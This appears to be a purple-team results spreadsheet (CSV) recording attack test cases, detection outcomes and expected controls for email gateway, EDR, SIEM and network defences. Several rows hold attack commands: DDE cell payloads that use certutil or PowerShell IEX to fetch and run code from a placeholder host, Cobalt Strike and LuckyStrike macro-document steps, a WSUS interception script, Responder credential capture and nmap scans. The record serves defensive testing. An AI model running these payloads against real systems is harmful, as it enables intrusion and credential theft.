Enterprise Purple – 2019 Q1,App Server Discovery and Exploitation,Exploitation,Targeted Scans and Fuzzing - Tomcat,T1068,,Web application probing,Completed,NotDetected,TBD,TBD,No,,"1) Suspicious internal scanning is detected by firewall/IDS/IPS, UEBA tool, or honeypot technology,2) Event logs for commonly targeted application server platforms are ingested to SIEM for further analysis and alerting on suspicious activity (e.g. intrusion attempts to Tomcat, Jenkins, JBoss, critical business applications, SSO services, etc.)",,,"SIEM,Behavior Analytics",,2019-01-17T13:05:16.197Z,1547730316197,2019-01-17T13:52:44.197Z,1547733164197,2019-01-17T14:12:28.197Z,1547734348197,Security Risk Advisors,,"Run targeted scanning of dynamic web pages with tools such as Burp's Active Scan to look for common vulnerabilities (e.g. OWASP top 10) including SQLi, command injection, XSS and default credentials on popular application web consoles such as JBoss and Tomcat.",msf> use auxiliary/scanner/http/tomcat_mgr_login,,High,High,Internal,Medium,,,,"Manual Techniques,BurpSuite"
Enterprise Purple – 2019 Q1,App Server Discovery and Exploitation,Discovery,Targeted Scans and Fuzzing - Target Group 2,T1046,,Web application probing,Completed,Detected,Med,TBD,Yes,,,,,"SIEM,Behavior Analytics",Batrider,2019-01-17T15:47:33.197Z,1547740053197,2019-01-17T16:23:28.197Z,1547742208197,2019-01-28T22:27:25.388Z,1548714445388,Security Risk Advisors,,"Run targeted scanning of dynamic web pages with tools such as Burp's Active Scan to look for common vulnerabilities (e.g. OWASP top 10) including SQLi, command injection, XSS and default credentials on popular application web consoles such as JBoss and Tomcat.",Use burp active scan,,High,High,Internal,Medium,,,,"Manual Techniques,BurpSuite"
Enterprise Purple – 2019 Q1,App Server Discovery and Exploitation,Discovery,"Internal - Stealth Port Scan with 3 ports, service enumeration, and NSE's",T1046,,Port scanning,Completed,Detected,Med,TBD,Yes,,"1) Internal port scanning activity detected by potential firewall/IDS/IPS, UEBA tool, or honeypot technology",,,"Firewall,Behavior Analytics",Batrider,2019-01-17T03:47:30.197Z,1547696850197,2019-01-17T04:40:50.197Z,1547700050197,2019-01-28T22:26:53.431Z,1548714413431,Security Risk Advisors,,Run lighter internal port scanning to probe interesting HTTP ports and services.,,,High,Low,Internal,Medium,,,,Nmap
Enterprise Purple – 2019 Q1,Register Phishing Domains,Reconnaissance,Domain registration containing brand keyword,,,Register possible phishing domain,Completed,Detected,High,TBD,No,,1) Phishing domain is alerted by possible brand monitoring / DNS monitoring service.,,,,,2019-01-04T18:04:03.197Z,1546625043197,2019-01-04T19:00:34.197Z,1546628434197,2019-01-28T21:50:58.558Z,1548712258558,Security Risk Advisors,,Register domains containing company keywords/branding,,,High,Medium,External,Medium,,,,
Enterprise Purple – 2019 Q1,Register Phishing Domains,Reconnaissance,Domain registration containing lexically close name,,,Register possible phishing domain,Completed,NotDetected,TBD,TBD,No,,1) Phishing domain is alerted by possible brand monitoring / DNS monitoring service.,,,,,2019-01-04T21:19:51.197Z,1546636791197,2019-01-04T21:39:46.197Z,1546637986197,2019-01-04T22:12:35.197Z,1546639955197,Security Risk Advisors,,Register domains containing names that resemble prominent web domains.,,,High,Medium,External,Medium,,,,
Enterprise Purple – 2019 Q1,Network MiTM,Exploitation,LLMNR,T1557.001,,Network spoofing,Completed,Blocked,TBD,No,No,,1) Rogue device triggers alert from NAC solution or potential UEBA tool when broadcasting lots of traffic.,,,"Network Isolation,Secure Baselines,Behavior Analytics",Secure Configs,2019-01-16T06:00:10.197Z,1547618410197,2019-01-16T06:40:20.197Z,1547620820197,2019-01-28T22:24:17.745Z,1548714257745,Security Risk Advisors,,"Respond to local network queries for systems over LLMNR and NetBIOS, obtain domain user password hashes and clear text credentials.",,,High,High,Internal,Medium,,,,Responder
Enterprise Purple – 2019 Q1,Network MiTM,Exploitation,Basic Auth & WPAD,T1040,,Network spoofing,Completed,Blocked,TBD,No,TBD,,1) Rogue device triggers alert from NAC solution or potential UEBA tool when broadcasting lots of traffic.,,,"Network Isolation,Secure Baselines,Behavior Analytics",Secure Configs,2019-01-16T12:09:52.197Z,1547640592197,2019-01-16T13:52:10.197Z,1547646730197,2019-01-16T14:08:55.197Z,1547647735197,Security Risk Advisors,,"Respond to local network queries for systems over LLMNR and NetBIOS, obtain domain user password hashes and clear text credentials",,,High,High,Internal,Medium,,,,Responder
Enterprise Purple – 2019 Q1,Network MiTM,Exploitation,Unencrypted Windows Update,T1040,,Network spoofing,Completed,Blocked,TBD,No,TBD,,,,,Secure Baselines,Secure Configs,2019-01-16T04:00:15.197Z,1547611215197,2019-01-16T05:32:29.197Z,1547616749197,2019-01-16T05:35:34.197Z,1547616934197,Security Risk Advisors,,Intercept Windows Updates on the target laptop in order to run a malicious binary,./wsuxploit.sh <TARGET_IP> <WSUS_IP> <WSUS_PORT> <BINARY_PATH>,,High,High,Internal,Medium,,,,
Enterprise Purple – 2019 Q1,Network MiTM,Exploitation,Inveigh,T1557.001,,Network Spoofing,Completed,Blocked,TBD,No,No,,1) Rogue device triggers alert from NAC solution or potential UEBA tool when broadcasting lots of traffic.,,,"Network Isolation,Secure Baselines,Behavior Analytics",Secure Configs,2019-01-16T09:07:43.197Z,1547629663197,2019-01-16T09:21:19.197Z,1547630479197,2019-01-28T22:24:52.865Z,1548714292865,Security Risk Advisors,,Run the powershell inveigh toolset via a beacon.,Invoke-Inveigh  NBNS - Y,,Low,Low,Internal,Low,,,,
Enterprise Purple – 2019 Q1,Email with Malicious Links,Delivery,17 - Link - Macro - LuckyStrike PowerShell CellEmbed + Sandbox Evasion,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2019-01-09T11:06:43.197Z,1547032003197,2019-01-09T11:34:32.197Z,1547033672197,2019-01-09T12:41:54.197Z,1547037714197,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"Run as admin:
.\luckystrike.ps1

Catalog Options -> Add Payload to Catalog (Name is required, everything else can be skipped) -> Powershell Script

Main Menu -> Payload Options -> xls  -> Cell Embedded

File Options -> File options -> Payload options  -> Generate New File",,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2019 Q1,Email with Malicious Links,Delivery,2 - Link - Macro - CobaltStrike Standard (MMG),T1566.002,,Phishing Payload,Completed,Blocked,TBD,No,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,"Batsugun,Slap Fight",2019-01-07T16:12:27.197Z,1546877547197,2019-01-07T16:36:17.197Z,1546878977197,2019-01-07T18:04:56.197Z,1546884296197,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,python MMG.py [config] [output],,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2019 Q1,Email with Malicious Links,Delivery,20 - Link - Password-protected Office Doc - Standard CS payload,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2019-01-09T18:56:59.197Z,1547060219197,2019-01-09T20:11:11.197Z,1547064671197,2019-01-09T20:19:45.197Z,1547065185197,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"Generate standard office payload using cobalt strike from Attacks -> Packages -> MS Office Macro

When saving the malicious macro, encrypt the document with a password by: Save -> Info -> Protect Document -> Encrypt With Password",,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2019 Q1,Email with Malicious Links,Delivery,14 - Link - Macro - Remote Template,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2019-01-09T06:07:18.197Z,1547014038197,2019-01-09T07:19:59.197Z,1547018399197,2019-01-09T09:14:38.197Z,1547025278197,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"Create a Word document, add the macro, then save as a .dotm 

Host the template

Create a new document and link the hosted template to it 
(Developer -> Document Template -> Document Template Url)",,Low,Low,External,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2019 Q1,Email with Malicious Links,Delivery,21 - Link - Link Inside PDF,T1566.002,,Phishing Payload,Completed,Blocked,TBD,No,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Batsugun,2019-01-09T20:59:12.197Z,1547067552197,2019-01-09T22:09:06.197Z,1547071746197,2019-01-28T22:54:19.077Z,1548716059077,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Create a PDF with a malicious link in it and send using email,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2019 Q1,Email with Malicious Links,Delivery,10 - Link - Macro - MSBuild,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2019-01-08T14:22:01.197Z,1546957321197,2019-01-08T14:41:18.197Z,1546958478197,2019-01-08T14:57:10.197Z,1546959430197,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe <MALICIOUS_FILE>,,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2019 Q1,Email with Malicious Links,Delivery,22 - Link - Link Inside Office Document,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2019-01-10T00:34:18.197Z,1547080458197,2019-01-10T01:00:13.197Z,1547082013197,2019-01-10T02:52:23.197Z,1547088743197,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Send a office document with a malicious link in it,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2019 Q1,Email with Malicious Links,Delivery,5 - Link - Macro - WScript PowerShell,T1566.002,,Phishing Payload,Completed,Blocked,TBD,No,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,"Batsugun,Slap Fight",2019-01-07T23:06:59.197Z,1546902419197,2019-01-08T00:58:59.197Z,1546909139197,2019-01-08T01:14:07.197Z,1546910047197,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Copy macro template into office document,,Low,Low,External,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2019 Q1,Email with Malicious Links,Delivery,1 - Link - Macro - Cobalt Strike Standard,T1566.002,,Phishing Payload,Completed,Blocked,TBD,No,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,"Batsugun,Slap Fight",2019-01-07T13:20:20.197Z,1546867220197,2019-01-07T13:20:55.197Z,1546867255197,2019-01-07T14:26:37.197Z,1546871197197,Security Risk Advisors,,Send phishing email to victim containing link with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"Attacks --> Packages --> MS Office Macro
Copy code to office document",,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2019 Q1,Email with Malicious Links,Delivery,16 - Link - Archive - DDE,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2019-01-09T09:34:53.197Z,1547026493197,2019-01-09T10:40:01.197Z,1547030401197,2019-01-09T10:55:50.197Z,1547031350197,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Zip the dde office document,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2019 Q1,Email with Malicious Links,Delivery,12 - Link - Macro - MMG WMI Exe,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2019-01-08T23:05:30.197Z,1546988730197,2019-01-08T23:16:52.197Z,1546989412197,2019-01-09T01:08:58.197Z,1546996138197,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,python MMG.py [config] [output],,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2019 Q1,Email with Malicious Links,Delivery,3 - Link - Macro - Cobalt Strike Standard as HREF (URL Rewrite Update),T1566.002,,Phishing Payload,Completed,Blocked,TBD,No,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Batsugun,2019-01-07T19:08:43.197Z,1546888123197,2019-01-07T20:10:09.197Z,1546891809197,2019-01-28T22:50:55.498Z,1548715855498,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,,,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2019 Q1,Email with Malicious Links,Delivery,8 - Link - Macro - MMG WMI PowerShell,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,No,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2019-01-08T07:42:35.197Z,1546933355197,2019-01-08T09:25:25.197Z,1546939525197,2019-01-28T22:52:50.650Z,1548715970650,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,python MMG.py [config] [output],,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2019 Q1,Email with Malicious Links,Delivery,15 - Link - Archive - Macro,T1566.002,,Phishing Payload,Completed,Blocked,TBD,No,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,"Batsugun,Slap Fight",2019-01-08T20:25:33.197Z,1546979133197,2019-01-08T21:35:04.197Z,1546983304197,2019-01-08T22:50:21.197Z,1546987821197,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Zip or rar malicious document and send using email,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2019 Q1,Email with Malicious Links,Delivery,9 - Link - Macro - LuckyStrike PowerShell CellEmbed,T1566.002,,Phishing Payload,Completed,Blocked,TBD,No,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Batsugun,2019-01-08T12:05:21.197Z,1546949121197,2019-01-08T12:56:19.197Z,1546952179197,2019-01-28T22:54:43.309Z,1548716083309,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"Run as admin:
.\luckystrike.ps1

Catalog Options -> Add Payload to Catalog (Name is required, everything else can be skipped) -> Powershell Script

Main Menu -> Payload Options -> xls  -> Cell Embedded

File Options -> File options -> Payload options  -> Generate New File",,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2019 Q1,Email with Malicious Links,Delivery,4 - Link - Macro - Cobalt Strike Standard (URL Rewrite Update),T1566.002,,Phishing Payload,Completed,Blocked,TBD,No,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Batsugun,2019-01-07T21:20:12.197Z,1546896012197,2019-01-07T22:10:24.197Z,1546899024197,2019-01-28T22:51:09.765Z,1548715869765,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,,,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2019 Q1,Email with Malicious Links,Delivery,13 - Link - DDE - Exe,T1566.002,,Phishing Payload,Completed,Blocked,TBD,No,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Slap Fight,2019-01-09T02:33:22.197Z,1547001202197,2019-01-09T04:18:46.197Z,1547007526197,2019-01-29T08:34:31.235Z,1548750871235,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,=cmd|'/c certutil https://<exe url> <local file location> && <local file location> && del <local file location>'!A1,,Low,Low,External,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2019 Q1,Email with Malicious Links,Delivery,11 - Link - DDE - PowerShell,T1566.002,,Phishing Payload,Completed,Blocked,TBD,No,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,"Batsugun,Slap Fight",2019-01-08T16:46:39.197Z,1546965999197,2019-01-08T17:31:08.197Z,1546968668197,2019-01-28T21:58:32.264Z,1548712712264,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"=cmd|'/c powershell -Exec ByPass -nop -noexit -c IEX ((New-Object Net.WebClient).DownloadString(\""http://<location of payload>\""))'!A1",,Low,Low,External,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2019 Q1,Email with Malicious Links,Delivery,18 - Link - Encrypted Archive - Macro,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2019-01-09T14:22:46.197Z,1547043766197,2019-01-09T14:36:43.197Z,1547044603197,2019-01-09T15:14:59.197Z,1547046899197,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Zip or rar and encrypt malicious document,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2019 Q1,Email with Malicious Links,Delivery,19 - Link - Encrypted Archive - DDE,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2019-01-09T16:50:15.197Z,1547052615197,2019-01-09T17:12:35.197Z,1547053955197,2019-01-09T18:28:27.197Z,1547058507197,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Zip and encrypt the dde office document,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2019 Q1,Email with Malicious Links,Delivery,6 - Link - Macro - WScript EXE,T1566.002,,Phishing Payload,Completed,Blocked,TBD,No,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,"Batsugun,Slap Fight",2019-01-08T01:24:01.197Z,1546910641197,2019-01-08T02:49:01.197Z,1546915741197,2019-01-08T04:02:45.197Z,1546920165197,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Copy macro template into office document,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2019 Q1,Email with Malicious Links,Delivery,7 - Link - Macro - WScript PowerShell XOR,T1566.002,,Phishing Payload,Completed,Blocked,TBD,No,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Batsugun,2019-01-08T04:33:36.197Z,1546922016197,2019-01-08T05:01:05.197Z,1546923665197,2019-01-28T22:51:45.294Z,1548715905294,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Copy macro template into office document,,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2019 Q1,External Port Scans,Reconnaissance,"External - Moderate Port Scan with 10 ports, service enumeration, and NSE's",T1046,,Port scanning,Completed,Detected,Info,TBD,TBD,,"1) Port scanning is detected by external IDS/IPS or firewall, with alert triggered in SIEM or other alerting mechanism",,,"Firewall,SIEM",MUSHA,2019-01-03T05:47:18.197Z,1546494438197,2019-01-03T05:51:50.197Z,1546494710197,2019-01-28T21:48:05.472Z,1548712085472,Security Risk Advisors,,Identify open ports and services,"nmap --open -v 2 -sS -Pn -p 21,80,443,8080,8443 --script=ftp-anon.nse,ftp-proftpd-backdoor.nse,ftp-vsftpd-backdoor.nse,ftp-vuln-cve2010-4221.nse,http-admin-check.nse,http-title.nse --script-args=http.useragent=""Mozilla/5.0; Windows NT 6.1; WOW64; Trident/7.0; rv:11.0; like Gecko"" -oA scans/nmap_moderate -iL targets.txt",,High,Low,External,Low,,,,Nmap
Enterprise Purple – 2019 Q1,External Port Scans,Reconnaissance,"External - Noisy Port Scan with 1000 ports, service enumeration, and NSE's",T1046,,Port scanning,Completed,Detected,Info,TBD,TBD,,"1) Port scanning is detected by external IDS/IPS or firewall, with alert triggered in SIEM or other alerting mechanism",,,"Firewall,SIEM",MUSHA,2019-01-03T12:39:59.197Z,1546519199197,2019-01-03T13:10:27.197Z,1546521027197,2019-01-28T21:48:23.726Z,1548712103726,Security Risk Advisors,,Identify open ports and services,nmap --open -v2 -sS -Pn -oA nmap_noisy -iL ranges.txt,,High,Low,External,Low,,,,Nmap
Enterprise Purple – 2019 Q1,External Port Scans,Reconnaissance,"External - Stealthy Port Scan with 3 ports, service enumeration, limited NSE's",T1046,,Port scanning,Completed,Detected,Info,TBD,TBD,,"1) Port scanning is detected by external IDS/IPS or firewall, with alert triggered in SIEM or other alerting mechanism",,,"Firewall,SIEM",MUSHA,2019-01-03T08:55:15.197Z,1546505715197,2019-01-03T09:01:32.197Z,1546506092197,2019-01-28T21:48:36.632Z,1548712116632,Security Risk Advisors,,Identify open ports and services,"nmap --open -v 2 -sS -Pn -p 80,443,8080 --data-length 471 --randomize-hosts --script=http-title.nse --script-args=http.useragent=""Mozilla/5.0;Windows NT 6.1; WOW64; Trident/7.0; rv:11.0; like Gecko"" -oA scans/nmap_stealthy -iL targets.txt",,High,Low,External,Low,,,,Nmap
Enterprise Purple – 2019 Q1,Malicious Document Execution,Execution,4 - Macro - WScript EXE,T1203,,Client-side Execution,Completed,Detected,High,Yes,No,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection,Secure Baselines","DoDonpachi,Progear",2019-01-11T04:46:28.197Z,1547181988197,2019-01-11T06:44:11.197Z,1547189051197,2019-01-29T08:05:23.527Z,1548749123527,Security Risk Advisors,,Execute malicious Office document on the endpoint,Copy macro template into office document,,Low,Low,Internal,Low,,,,Manual Techniques
Enterprise Purple – 2019 Q1,Malicious Document Execution,Execution,9 - Macro - MSBuild,T1203,,Client-side Execution,Completed,Detected,High,TBD,No,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection,Secure Baselines",DoDonpachi,2019-01-10T14:02:12.197Z,1547128932197,2019-01-10T14:32:21.197Z,1547130741197,2019-01-28T22:06:01.716Z,1548713161716,Security Risk Advisors,,Execute malicious Office document on the endpoint,C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe <MALICIOUS_FILE>,,Low,Low,Internal,Low,,,,Cobalt Strike
Enterprise Purple – 2019 Q1,Malicious Document Execution,Execution,6 - Macro - MMG WMI PowerShell,T1203,,Client-side Execution,Completed,Blocked,TBD,Yes,TBD,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection,Secure Baselines",Ketsui,2019-01-11T09:38:06.197Z,1547199486197,2019-01-11T09:44:44.197Z,1547199884197,2019-01-11T10:00:25.197Z,1547200825197,Security Risk Advisors,,Execute malicious Office document on the endpoint,python MMG.py [config] [output],,Low,Low,Internal,Low,,,,Cobalt Strike
Enterprise Purple – 2019 Q1,Malicious Document Execution,Execution,7 - Macro - MMG WMI Exe,T1203,,Client-side Execution,Completed,Detected,High,Yes,No,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection,Secure Baselines","DoDonpachi,Progear",2019-01-11T10:47:28.197Z,1547203648197,2019-01-11T12:40:58.197Z,1547210458197,2019-01-29T08:06:07.884Z,1548749167884,Security Risk Advisors,,Execute malicious Office document on the endpoint,python MMG.py [config] [output],,Low,Low,Internal,Low,,,,Cobalt Strike
Enterprise Purple – 2019 Q1,Malicious Document Execution,Execution,3 - Macro - WScript PowerShell,T1203,,Client-side Execution,Completed,Blocked,TBD,Yes,TBD,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection,Secure Baselines",Ketsui,2019-01-10T08:43:24.197Z,1547109804197,2019-01-10T09:39:45.197Z,1547113185197,2019-01-10T10:33:22.197Z,1547116402197,Security Risk Advisors,,Execute malicious Office document on the endpoint,Copy macro template into office document,,Low,Low,Internal,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2019 Q1,Malicious Document Execution,Execution,8 - Macro - LuckyStrike PowerShell CellEmbed,T1203,,Client-side Execution,Completed,Blocked,TBD,Yes,No,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection,Secure Baselines",Ketsui,2019-01-10T16:27:35.197Z,1547137655197,2019-01-10T16:41:15.197Z,1547138475197,2019-01-28T22:04:44.900Z,1548713084900,Security Risk Advisors,,Execute malicious Office document on the endpoint,"Run as admin:
.\luckystrike.ps1

Catalog Options -> Add Payload to Catalog (Name is required, everything else can be skipped) -> Powershell Script

Main Menu -> Payload Options -> xls  -> Cell Embedded

File Options -> File options -> Payload options  -> Generate New File",,Low,Low,Internal,Low,,,,Cobalt Strike
Enterprise Purple – 2019 Q1,Malicious Document Execution,Execution,11 - DDE - Exe,T1203,,Client-side Execution,Completed,NotDetected,TBD,TBD,No,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection,Secure Baselines",,2019-01-10T19:41:23.197Z,1547149283197,2019-01-10T20:30:00.197Z,1547152200197,2019-01-10T21:59:25.197Z,1547157565197,Security Risk Advisors,,Execute malicious Office document on the endpoint,=cmd|'/c certutil https://<exe url> <local file location> && <local file location> && del <local file location>'!A1,,Low,Low,Internal,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2019 Q1,Malicious Document Execution,Execution,5 - Macro - WScript PowerShell XOR,T1203,,Client-side Execution,Completed,Blocked,TBD,Yes,TBD,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection,Secure Baselines",Ketsui,2019-01-10T11:13:30.197Z,1547118810197,2019-01-10T12:16:12.197Z,1547122572197,2019-01-10T12:51:18.197Z,1547124678197,Security Risk Advisors,,Execute malicious Office document on the endpoint,Copy macro template into office document,,Low,Low,Internal,Low,,,,Cobalt Strike
Enterprise Purple – 2019 Q1,Malicious Document Execution,Execution,10 - DDE - PowerShell,T1203,,Client-side Execution,Completed,Blocked,TBD,Yes,No,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection,Secure Baselines",Ketsui,2019-01-10T17:02:18.197Z,1547139738197,2019-01-10T17:07:20.197Z,1547140040197,2019-01-28T22:05:06.750Z,1548713106750,Security Risk Advisors,,Execute malicious Office document on the endpoint,"=cmd|'/c powershell -Exec ByPass -nop -noexit -c IEX ((New-Object Net.WebClient).DownloadString(\""http://<location of payload>\""))'!A1",,Low,Low,Internal,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2019 Q1,Malicious Document Execution,Execution,2 - Macro - CobaltStrike Standard (MMG),T1203,,Client-side Execution,Completed,Detected,High,Yes,No,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection,Secure Baselines","DoDonpachi,Progear",2019-01-11T02:50:16.197Z,1547175016197,2019-01-11T04:07:57.197Z,1547179677197,2019-01-29T08:04:42.052Z,1548749082052,Security Risk Advisors,,Execute malicious Office document on the endpoint,python MMG.py [config] [output],,Low,Low,Internal,Low,,,,Cobalt Strike
Enterprise Purple – 2019 Q1,Malicious Document Execution,Execution,12 - Macro - Remote Template,T1203,,Client-side Execution,Completed,Detected,High,TBD,TBD,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection,Secure Baselines","DoDonpachi,Progear",2019-01-10T23:21:02.197Z,1547162462197,2019-01-11T00:08:47.197Z,1547165327197,2019-01-11T00:54:06.197Z,1547168046197,Security Risk Advisors,,Execute malicious Office document on the endpoint,"Create a Word document, add the macro, then save as a .dotm 

Host the template

Create a new document and link the hosted template to it 
(Developer -> Document Template -> Document Template Url)",,Low,Low,Internal,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2019 Q1,Malicious Document Execution,Execution,1 - Macro - Cobalt Strike Standard,T1203,,Client-side Execution,Completed,Detected,High,Yes,TBD,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection,Secure Baselines","DoDonpachi,Progear",2019-01-10T04:27:31.197Z,1547094451197,2019-01-10T05:24:12.197Z,1547097852197,2019-01-29T08:03:46.863Z,1548749026863,Security Risk Advisors,,Execute malicious Office document on the endpoint,"Generate MS Office Macro from cobalt Strike (Attacks -> Packages -> MS Office Macro)

Put macro in office document

Execute the office document on endpoint",,Low,Low,Internal,Low,,,,Cobalt Strike
